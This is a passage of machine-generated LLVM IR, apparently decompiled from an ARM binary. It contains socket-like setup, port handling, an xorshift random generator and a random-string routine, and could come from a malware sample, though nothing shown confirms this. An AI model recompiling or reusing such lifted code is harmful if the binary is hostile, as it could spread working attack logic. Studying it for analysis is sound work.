  store i32 %v0_dd88, i32* %v2_dd88, align 4
  store i32 %v0_dd84, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_dd98 = load i32, i32* @r8, align 4
  %v1_dd98 = inttoptr i32 %v0_dd98 to i32*
  %v2_dd98 = load i32, i32* %v1_dd98, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dda4 = call i32 @function_114c4(i32 %v2_dd98, i32 %v2_de58, i32 2, i32 16386)
  %v7_dda8 = icmp eq i32 %v4_dda4, -1
  br i1 %v7_dda8, label %dec_label_pc_df84, label %dec_label_pc_ddb0

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dd7c
  %v2_ddb0 = icmp eq i32 %v4_dda4, 0
  br i1 %v2_ddb0, label %dec_label_pc_df94, label %dec_label_pc_ddb8

dec_label_pc_ddb8:                                ; preds = %dec_label_pc_ddb0
  store i32 %v2_dc74, i32* %ip.global-to-local, align 4
  %v3_ddbc = load i8*, i8** %stack_var_-42, align 4
  %v4_ddbc = ptrtoint i8* %v3_ddbc to i32
  store i32 %v4_ddbc, i32* %r3.global-to-local, align 4
  %v2_ddc0 = icmp eq i8* %v3_ddbc, null
  br i1 %v2_ddc0, label %dec_label_pc_ddc8, label %dec_label_pc_dfc4

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_ddb8
  %v0_ddc8 = load i32, i32* @r8, align 4
  %v1_ddc8 = inttoptr i32 %v0_ddc8 to i32*
  %v2_ddc8 = load i32, i32* %v1_ddc8, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_ddd4 = add i32 %v4_ddbc, 16384
  store i32 %v1_ddd4, i32* %r3.global-to-local, align 4
  %v4_ddd8 = call i32 @function_114c4(i32 %v2_ddc8, i32 %v2_de58, i32 2, i32 %v1_ddd4)
  br label %dec_label_pc_db48

dec_label_pc_dde0:                                ; preds = %dec_label_pc_dbb8
  %v0_dde8 = load i32, i32* @r4, align 4
  store i32 %v0_dde8, i32* %r2.global-to-local, align 4
  %v3_ddec = call i32 @function_115f4(i32 2, i32 1, i32 %v0_dde8)
  %v7_ddf0 = icmp eq i32 %v3_ddec, -1
  store i32 %v3_ddec, i32* @r5, align 4
  %v1_ddf8 = load i32, i32* %r8.global-to-local, align 4
  %v2_ddf8 = inttoptr i32 %v1_ddf8 to i32*
  store i32 %v3_ddec, i32* %v2_ddf8, align 4
  br i1 %v7_ddf0, label %dec_label_pc_dbc8, label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %dec_label_pc_dde0
  %v0_de00 = load i32, i32* @r4, align 4
  store i32 %v0_de00, i32* %r2.global-to-local, align 4
  %v2_de08 = call i32 @function_10c10(i32 %v3_ddec, i32 3)
  %v1_de10 = or i32 %v2_de08, 2048
  store i32 %v1_de10, i32* %r2.global-to-local, align 4
  %v0_de14 = load i32, i32* @r5, align 4
  %v2_de18 = call i32 @function_10c10(i32 %v0_de14, i32 4)
  %v2_de20 = load i32, i32* inttoptr (i32 124944 to i32*), align 16
  store i32 %v2_de20, i32* %r3.global-to-local, align 4
  %v2_de24 = icmp eq i32 %v2_de20, 0
  br i1 %v2_de24, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_de00
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_de00, %bb41
  %v2_de2c = xor i1 %v2_de24, true
  call void @__pseudo_cond_branch(i1 %v2_de2c, i32 %v2_de20)
  store i32 ptrtoint (i8** @global_var_1e9e0.93 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_de38 = load i32, i32* %r8.global-to-local, align 4
  %v1_de38 = inttoptr i32 %v0_de38 to i32*
  %v2_de38 = load i32, i32* %v1_de38, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1e9e0.93 to i8*), align 4
  %v4_de48 = call i32 @function_113dc(i32 %v2_de38, i32 ptrtoint (i16** @global_var_20a68.77 to i32), i32 16)
  br label %dec_label_pc_dbc8

dec_label_pc_de50:                                ; preds = %dec_label_pc_dc50
  %v0_de54 = load i32, i32* @fp, align 4
  %v1_de54 = inttoptr i32 %v0_de54 to i32*
  %v2_de54 = load i32, i32* %v1_de54, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_de64 = call i32 @function_11538(i32 %v2_de54, i32 %v2_de58, i32 2, i32 16384)
  br label %dec_label_pc_dc84

dec_label_pc_de6c:                                ; preds = %dec_label_pc_dcc8
  store i32 4, i32* @r4, align 4
  store i32 %v2_de74, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_de50, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_de90 = call i32 @function_1144c(i32 %v2_dd48, i32 1, i32 4, i32 %v2_de74, i32 %v2_de50)
  %v3_de94 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_de94, i32* %r3.global-to-local, align 4
  %v2_de98 = icmp eq i32 %v3_de94, 0
  br i1 %v2_de98, label %dec_label_pc_df20, label %dec_label_pc_dea0

dec_label_pc_dea0:                                ; preds = %dec_label_pc_de6c
  %v0_dea0 = load i32, i32* @r5, align 4
  %v1_dea0 = inttoptr i32 %v0_dea0 to i32*
  %v2_dea0 = load i32, i32* %v1_dea0, align 4
  %v1_dea4 = call i32 @function_10ddc(i32 %v2_dea0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_deac = load i32, i32* @r5, align 4
  %v2_deac = inttoptr i32 %v1_deac to i32*
  store i32 -1, i32* %v2_deac, align 4
  %v0_deb0 = call i32 @function_e0b8()
  %v3_deb8 = zext i32 %v0_deb0 to i64
  %v4_deb8 = mul nuw i64 %v3_deb8, 3435973837
  %v7_deb8 = trunc i64 %v4_deb8 to i32
  store i32 %v7_deb8, i32* %ip.global-to-local, align 4
  %v3_debc1 = udiv i64 %v4_deb8, 34359738368
  %v3_dec03 = mul nuw nsw i64 %v3_debc1, 8
  %v3_dec0 = trunc i64 %v3_dec03 to i32
  store i32 %v3_dec0, i32* %r2.global-to-local, align 4
  %v2_dec45 = mul nuw nsw i64 %v3_debc1, 2
  %v2_dec4 = trunc i64 %v2_dec45 to i32
  %v2_dec8 = add i32 %v3_dec0, %v2_dec4
  store i32 %v2_dec8, i32* %r3.global-to-local, align 4
  %v2_decc = sub i32 %v0_deb0, %v2_dec8
  %v1_ded0 = add i32 %v2_decc, 1
  %v1_ded4 = call i32 @function_12f00(i32 %v1_ded0)
  br label %dec_label_pc_db48

dec_label_pc_dedc:                                ; preds = %dec_label_pc_dc94
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_de74, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_def0 = call i32 @function_1136c(i32 %v2_dc88, i32 %v2_dee8, i32 %v2_de74, i32 16, i32 16)
  %v1_def4 = call i32 @function_c93c(i32 %v5_def0)
  store i32 %v1_db08, i32* @lr, align 4
  %v2_df04 = call i32 @function_10ba8(i32 %v1_df00, i32 9)
  store i32 ptrtoint (i32* @global_var_1e9dc.81 to i32), i32* %r3.global-to-local, align 4
  %v2_df0c = load i32, i32* @global_var_1e9dc.81, align 4
  %v2_df10 = icmp eq i32 %v2_df0c, 0
  br i1 %v2_df10, label %dec_label_pc_df18, label %dec_label_pc_dfb8

dec_label_pc_df18:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_dfb8
  %v1_df1c = call i32 @function_12e48(i32 0)
  br label %dec_label_pc_df20

dec_label_pc_df20:                                ; preds = %dec_label_pc_de6c, %dec_label_pc_df18
  %v2_df24 = call i32 @function_1031c(i8* %v1_df24)
  %sext = mul i32 %v2_df24, 16777216
  %v1_df28 = sdiv i32 %sext, 16777216
  %v7_df28 = inttoptr i32 %v1_df28 to i8*
  store i8* %v7_df28, i8** %stack_var_-42, align 4
  %v0_df2c = call i32 @function_105d8()
  %v0_df34 = load i32, i32* @r4, align 4
  store i32 %v0_df34, i32* %r2.global-to-local, align 4
  store i32 %v0_df2c, i32* @global_var_20a5c.46, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_df44 = load i32, i32* @r5, align 4
  %v1_df44 = inttoptr i32 %v0_df44 to i32*
  %v2_df44 = load i32, i32* %v1_df44, align 4
  %v4_df48 = call i32 @function_11538(i32 %v2_df44, i32 ptrtoint (i32* @global_var_16194.99 to i32), i32 %v0_df34, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_df54 = load i32, i32* @r5, align 4
  %v1_df54 = inttoptr i32 %v0_df54 to i32*
  %v2_df54 = load i32, i32* %v1_df54, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_df60 = call i32 @function_11538(i32 %v2_df54, i32 %v2_de58, i32 1, i32 16384)
  %v3_df64 = load i8*, i8** %stack_var_-42, align 4
  %v4_df64 = ptrtoint i8* %v3_df64 to i32
  store i32 %v4_df64, i32* %r2.global-to-local, align 4
  %v3_df68 = icmp eq i8* %v3_df64, null
  br i1 %v3_df68, label %dec_label_pc_db48, label %dec_label_pc_df70

dec_label_pc_df70:                                ; preds = %dec_label_pc_df20
  %v0_df70 = load i32, i32* @r5, align 4
  %v1_df70 = inttoptr i32 %v0_df70 to i32*
  %v2_df70 = load i32, i32* %v1_df70, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_df7c = call i32 @function_11538(i32 %v2_df70, i32 %v2_d984, i32 %v4_df64, i32 16384)
  br label %dec_label_pc_db48

dec_label_pc_df84:                                ; preds = %dec_label_pc_dff4, %dec_label_pc_dd7c
  %v0_df84 = load i32, i32* @r5, align 4
  %v1_df84 = inttoptr i32 %v0_df84 to i32*
  %v2_df84 = load i32, i32* %v1_df84, align 4
  store i32 %v2_df84, i32* %r3.global-to-local, align 4
  %v7_df88 = icmp eq i32 %v2_df84, 4
  br i1 %v7_df88, label %dec_label_pc_db48, label %bb43

bb43:                                             ; preds = %dec_label_pc_df84
  %v8_df8c = icmp eq i32 %v2_df84, 11
  br i1 %v8_df8c, label %dec_label_pc_db48, label %dec_label_pc_df94

dec_label_pc_df94:                                ; preds = %dec_label_pc_e018, %bb43, %dec_label_pc_ddb0
  %v0_df94 = load i32, i32* @fp, align 4
  %v1_df94 = inttoptr i32 %v0_df94 to i32*
  %v2_df94 = load i32, i32* %v1_df94, align 4
  store i32 57248, i32* @lr, align 4
  %v1_df9c = icmp ne i32 %v2_df94, -1
  call void @__pseudo_cond_branch(i1 %v1_df9c, i32 ptrtoint (i32* @global_var_10ddc.95 to i32))
  store i32 124940, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* inttoptr (i32 124940 to i32*), align 4
  %v1_dfb0 = call i32 @function_12f00(i32 1)
  br label %dec_label_pc_db48

dec_label_pc_dfb8:                                ; preds = %dec_label_pc_dedc
  %v2_dfbc = call i32 @function_10ba8(i32 %v2_df0c, i32 9)
  br label %dec_label_pc_df18

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_ddb8
  %v3_dfc4 = udiv i32 %v4_ddbc, 256
  %v1_dfc8 = urem i32 %v4_ddbc, 256
  store i32 %v1_dfc8, i32* %r3.global-to-local, align 4
  %v4_dfcc = mul nuw nsw i32 %v1_dfc8, 256
  %v5_dfcc = or i32 %v4_dfcc, %v3_dfc4
  %v6_dfcc = trunc i32 %v5_dfcc to i16
  store i32 %v5_dfcc, i32* %r2.global-to-local, align 4
  %v7_dfd8 = inttoptr i32 %v5_dfcc to i8*
  store i8* %v7_dfd8, i8** %stack_var_-42, align 4
  %tmp44 = icmp ult i16 %v6_dfcc, 1025
  br i1 %tmp44, label %dec_label_pc_dff4, label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_dfc4
  %v0_dfe0 = load i32, i32* @r8, align 4
  %v1_dfe0 = inttoptr i32 %v0_dfe0 to i32*
  %v2_dfe0 = load i32, i32* %v1_dfe0, align 4
  %v1_dfe4 = call i32 @function_10ddc(i32 %v2_dfe0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dfec = load i32, i32* @r8, align 4
  %v2_dfec = inttoptr i32 %v1_dfec to i32*
  store i32 -1, i32* %v2_dfec, align 4
  br label %dec_label_pc_db48

dec_label_pc_dff4:                                ; preds = %dec_label_pc_dfc4
  %v0_dff4 = load i32, i32* @r4, align 4
  %v1_dff4 = load i32, i32* @r5, align 4
  %v2_dff4 = inttoptr i32 %v1_dff4 to i32*
  store i32 %v0_dff4, i32* %v2_dff4, align 4
  store i32 %v2_dffc, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_e004 = load i32, i32* @r8, align 4
  %v1_e004 = inttoptr i32 %v0_e004 to i32*
  %v2_e004 = load i32, i32* %v1_e004, align 4
  %v7_e00c = call i32 @function_114c4(i32 %v2_e004, i32 %v2_dffc, i32 %v5_dfcc, i32 16386)
  %v7_e010 = icmp eq i32 %v7_e00c, -1
  br i1 %v7_e010, label %dec_label_pc_df84, label %dec_label_pc_e018

dec_label_pc_e018:                                ; preds = %dec_label_pc_dff4
  %v2_e018 = icmp eq i32 %v7_e00c, 0
  br i1 %v2_e018, label %dec_label_pc_df94, label %dec_label_pc_e020

dec_label_pc_e020:                                ; preds = %dec_label_pc_e018
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e02c = load i32, i32* @r8, align 4
  %v1_e02c = inttoptr i32 %v0_e02c to i32*
  %v2_e02c = load i32, i32* %v1_e02c, align 4
  %v4_e030 = call i32 @function_114c4(i32 %v2_e02c, i32 %v2_de58, i32 2, i32 16384)
  %v3_e038 = load i8*, i8** %stack_var_-42, align 4
  %v4_e038 = ptrtoint i8* %v3_e038 to i32
  %v3_e03c = udiv i32 %v4_e038, 256
  %v1_e040 = urem i32 %v4_e038, 256
  store i32 %v1_e040, i32* %r3.global-to-local, align 4
  %v4_e044 = mul nuw nsw i32 %v1_e040, 256
  %v5_e044 = or i32 %v4_e044, %v3_e03c
  store i32 %v5_e044, i32* %ip.global-to-local, align 4
  store i32 %v2_dc74, i32* @lr, align 4
  store i32 %v5_e044, i32* %r2.global-to-local, align 4
  %v0_e054 = load i32, i32* @r8, align 4
  %v1_e054 = inttoptr i32 %v0_e054 to i32*
  %v2_e054 = load i32, i32* %v1_e054, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e05c = inttoptr i32 %v5_e044 to i8*
  store i8* %v6_e05c, i8** %stack_var_-42, align 4
  %v6_e060 = call i32 @function_114c4(i32 %v2_e054, i32 %v2_dffc, i32 %v5_e044, i32 16384)
  store i32 %v2_dc74, i32* %r2.global-to-local, align 4
  %v3_e068 = load i8*, i8** %stack_var_-42, align 4
  %v3_e06c = icmp eq i8* %v3_e068, null
  br i1 %v3_e06c, label %dec_label_pc_db48, label %dec_label_pc_e074

dec_label_pc_e074:                                ; preds = %dec_label_pc_e020
  %v4_e068 = ptrtoint i8* %v3_e068 to i32
  %v5_e078 = call i32 @function_82e8(i32* nonnull %stack_var_-1432, i32 %v4_e068, i32 %v2_dc74)
  br label %dec_label_pc_db48

; uselistorder directives
  uselistorder i8* %v3_e068, { 1, 0 }
  uselistorder i32 %v5_e044, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e038, { 1, 0 }
  uselistorder i32 %v7_e00c, { 1, 0 }
  uselistorder i32 %v5_dfcc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_ddec, { 3, 2, 1, 0 }
  uselistorder i32 %v4_ddbc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dda4, { 1, 0 }
  uselistorder i32 %v2_dd48, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_dc88, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_dc70, { 1, 0, 2 }
  uselistorder i32 %v5_dc3c, { 1, 2, 0 }
  uselistorder i32 %v2_db88, { 2, 1, 0 }
  uselistorder i32 %v1_db78, { 1, 2, 0 }
  uselistorder i32 %v1_db5c, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_de74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_de58, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_de50, { 1, 0 }
  uselistorder i32 %v2_dc74, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_db44, { 1, 0, 2 }
  uselistorder i32 %v2_d9e8, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_d9d4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_d900, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 31, 30, 34, 32, 33, 25, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_1e9dc.81, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @function_12f00, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e9e0.93 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e9e0.93 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* inttoptr (i32 124936 to i32*), { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32)* @function_d800, { 1, 0 }
  uselistorder i32 (i32)* @function_cef8, { 1, 0 }
  uselistorder i32 (i32)* @function_85e0, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_e17c, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_d654, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_d7b8.69 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_20a68.77 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @function_116a0, { 1, 0 }
  uselistorder label %dec_label_pc_df20, { 1, 0 }
  uselistorder label %dec_label_pc_df18, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_dc84, { 2, 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_dbc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbb8, { 1, 0 }
  uselistorder label %dec_label_pc_db48, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d9a8, { 2, 0, 1 }
}

define i32 @function_e09c(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_e09c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_e09c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e09c, label %bb, label %dec_label_pc_e09c..thread1_crit_edge

dec_label_pc_e09c..thread1_crit_edge:             ; preds = %dec_label_pc_e09c
  %v0_e0a8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %.thread1

bb:                                               ; preds = %dec_label_pc_e09c
  %v6_e0a4 = and i32 %arg1, 262144
  %v7_e0a4 = icmp ne i32 %v6_e0a4, 0
  store i1 %v7_e0a4, i1* %cpsr_c.global-to-local, align 1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e09c..thread1_crit_edge, %bb
  %v0_e0a8 = phi i1 [ %v0_e0a8.pre, %dec_label_pc_e09c..thread1_crit_edge ], [ %v7_e0a4, %bb ]
  call void @__pseudo_cond_branch(i1 %v0_e0a8, i32 -22312100)
  %v0_e0b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0b0, label %bb4, label %.thread2

bb4:                                              ; preds = %.thread1
  %v1_e0b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e0b0 = inttoptr i32 %v1_e0b0 to i64*
  %v3_e0b0 = load i64, i64* %v2_e0b0, align 4
  %v4_e0b0 = load i32, i32* @ip, align 4
  %v5_e0b0 = trunc i64 %v3_e0b0 to i32
  call void @__pseudo_branch(i32 %v5_e0b0)
  %v9_e0b0 = sub i32 %v1_e0b0, %v4_e0b0
  store i32 %v9_e0b0, i32* %r1.global-to-local, align 4
  %v0_e0b4.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0b4.pr, label %bb5, label %.thread2

bb5:                                              ; preds = %bb4
  %v1_e0b4 = load i32, i32* @r4, align 4
  %v3_e0b4 = mul i32 %v1_e0b4, %v9_e0b0
  store i32 %v3_e0b4, i32* %r1.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread1, %bb4, %bb5
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_e0b8() local_unnamed_addr {
dec_label_pc_e0b8:
  %v2_e0c4 = load i32, i32* @global_var_1e9e4.101, align 4
  %v2_e0c8 = load i32, i32* @global_var_1e9f0.103, align 4
  %v4_e0d4 = mul i32 %v2_e0c4, 2048
  %v5_e0d4 = xor i32 %v4_e0d4, %v2_e0c4
  store i32 %v5_e0d4, i32* @r3, align 4
  %v4_e0d8 = udiv i32 %v2_e0c8, 524288
  %v5_e0d8 = xor i32 %v4_e0d8, %v2_e0c8
  %v2_e0dc = load i32, i32* @global_var_1e9e8.105, align 4
  %v2_e0e0 = load i32, i32* @global_var_1e9ec.107, align 4
  store i32 %v2_e0e0, i32* @ip, align 4
  %v2_e0e4 = xor i32 %v5_e0d8, %v5_e0d4
  %v4_e0e8 = udiv i32 %v5_e0d4, 256
  %v5_e0e8 = xor i32 %v2_e0e4, %v4_e0e8
  store i32 %v2_e0dc, i32* @global_var_1e9e4.101, align 4
  store i32 %v2_e0e0, i32* @global_var_1e9e8.105, align 4
  store i32 %v2_e0c8, i32* @global_var_1e9ec.107, align 4
  store i32 %v5_e0e8, i32* @global_var_1e9f0.103, align 4
  ret i32 %v5_e0e8

; uselistorder directives
  uselistorder i32 %v2_e0c8, { 2, 1, 0 }
  uselistorder i32 %v2_e0c4, { 1, 0 }
}

define i32 @function_e114(i32 %arg1) local_unnamed_addr {
dec_label_pc_e114:
  %v2_e120 = call i32 @function_10a5c(i32* null)
  store i32 %v2_e120, i32* @r0, align 4
  store i32 %v2_e120, i32* @global_var_1e9e4.101, align 4
  %v0_e12c = call i32 @function_10a48()
  store i32 %v0_e12c, i32* @r0, align 4
  %v0_e134 = call i32 @function_109a0()
  %v2_e13c = xor i32 %v0_e12c, %v0_e134
  store i32 %v2_e13c, i32* @global_var_1e9e8.105, align 4
  %v1_e144 = call i32 @function_11220(i32 %v2_e13c)
  %v2_e148 = load i32, i32* @global_var_1e9e8.105, align 4
  %v2_e154 = xor i32 %v2_e148, %v1_e144
  store i32 %v2_e154, i32* @global_var_1e9f0.103, align 4
  store i32 %v1_e144, i32* @global_var_1e9ec.107, align 4
  ret i32 %v1_e144

; uselistorder directives
  uselistorder i32 %v1_e144, { 1, 2, 0 }
  uselistorder i32 ()* @function_109a0, { 2, 1, 0 }
}

define i32 @function_e17c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e17c:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e17c = load i32, i32* @r4, align 4
  %v6_e17c = load i32, i32* @r5, align 4
  %v9_e17c = load i32, i32* @r6, align 4
  %v12_e17c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e190 = call i32 @function_fd64(i32 31)
  %v3_e19c = call i32 @function_fca0(i32 31, i32* null)
  store i32 %v3_e19c, i32* @r1, align 4
  %v2_e1a8 = bitcast i32* %stack_var_-72 to i8*
  %v3_e1a8 = call i32 @function_11320(i8* %v2_e1a8, i32 %v3_e19c)
  %v2_e1ac = icmp eq i32 %arg2, 0
  br i1 %v2_e1ac, label %dec_label_pc_e228, label %dec_label_pc_e1b4

dec_label_pc_e1b4:                                ; preds = %dec_label_pc_e17c
  store i32 ptrtoint (i32* @global_var_1e9e4.101 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9e8.105 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9ec.107 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1e9f0.103 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e20c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e1c8

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e1c8.dec_label_pc_e1c8_crit_edge, %dec_label_pc_e1b4
  %v1_e1ec = phi i32 [ %v1_e1ec.pre, %dec_label_pc_e1c8.dec_label_pc_e1c8_crit_edge ], [ ptrtoint (i32* @global_var_1e9e4.101 to i32), %dec_label_pc_e1b4 ]
  %v2_e1c8 = load i32, i32* @global_var_1e9f0.103, align 4
  store i32 %v2_e1c8, i32* %r2.global-to-local, align 4
  %v2_e1cc = load i32, i32* @global_var_1e9e4.101, align 4
  %v4_e1d0 = udiv i32 %v2_e1c8, 524288
  %v5_e1d0 = xor i32 %v4_e1d0, %v2_e1c8
  %v4_e1d4 = mul i32 %v2_e1cc, 2048
  %v5_e1d4 = xor i32 %v4_e1d4, %v2_e1cc
  %v2_e1d8 = xor i32 %v5_e1d0, %v5_e1d4
  %v2_e1dc = load i32, i32* @global_var_1e9e8.105, align 4
  %v2_e1e0 = load i32, i32* @global_var_1e9ec.107, align 4
  store i32 %v2_e1e0, i32* @ip, align 4
  %v4_e1e4 = udiv i32 %v5_e1d4, 256
  %v5_e1e4 = xor i32 %v2_e1d8, %v4_e1e4
  store i32 %v5_e1e4, i32* @r4, align 4
  %v2_e1ec = inttoptr i32 %v1_e1ec to i32*
  store i32 %v2_e1dc, i32* %v2_e1ec, align 4
  %v0_e1f0 = load i32, i32* @ip, align 4
  %v1_e1f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_e1f0 = inttoptr i32 %v1_e1f0 to i32*
  store i32 %v0_e1f0, i32* %v2_e1f0, align 4
  %v0_e1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e1f4 = load i32, i32* @r7, align 4
  %v2_e1f4 = inttoptr i32 %v1_e1f4 to i32*
  store i32 %v0_e1f4, i32* %v2_e1f4, align 4
  %v0_e1f8 = load i32, i32* @r4, align 4
  %v1_e1f8 = load i32, i32* @r6, align 4
  %v2_e1f8 = inttoptr i32 %v1_e1f8 to i32*
  store i32 %v0_e1f8, i32* %v2_e1f8, align 4
  %v2_e1fc = call i32 @function_1031c(i8* %v2_e1a8)
  %v0_e204 = load i32, i32* @r4, align 4
  %v2_e208 = call i32 @function_10974(i32 %v0_e204, i32 %v2_e1fc)
  %v2_e210 = add i32 %v2_e1fc, %v2_e20c
  %v1_e214 = add i32 %v2_e210, -32
  %v2_e214 = inttoptr i32 %v1_e214 to i8*
  %v3_e214 = load i8, i8* %v2_e214, align 1
  %v2_e218 = load i32, i32* @r5, align 4
  %v3_e218 = load i32, i32* %fp.global-to-local, align 4
  %v4_e218 = add i32 %v3_e218, %v2_e218
  %v5_e218 = inttoptr i32 %v4_e218 to i8*
  store i8 %v3_e214, i8* %v5_e218, align 1
  %v0_e21c = load i32, i32* @r5, align 4
  %v1_e21c = add i32 %v0_e21c, 1
  store i32 %v1_e21c, i32* @r5, align 4
  %v1_e220 = load i32, i32* %sb.global-to-local, align 4
  %v9_e220 = icmp eq i32 %v1_e21c, %v1_e220
  br i1 %v9_e220, label %dec_label_pc_e228, label %dec_label_pc_e1c8.dec_label_pc_e1c8_crit_edge

dec_label_pc_e1c8.dec_label_pc_e1c8_crit_edge:    ; preds = %dec_label_pc_e1c8
  %v1_e1ec.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1c8

dec_label_pc_e228:                                ; preds = %dec_label_pc_e1c8, %dec_label_pc_e17c
  %v1_e22c = call i32 @function_fcc4(i32 31)
  store i32 %v3_e17c, i32* @r4, align 4
  store i32 %v6_e17c, i32* @r5, align 4
  store i32 %v9_e17c, i32* @r6, align 4
  store i32 %v12_e17c, i32* @r7, align 4
  ret i32 %v1_e22c

; uselistorder directives
  uselistorder i32 %v2_e1cc, { 1, 0 }
  uselistorder i32 %v2_e1c8, { 1, 0, 2 }
}

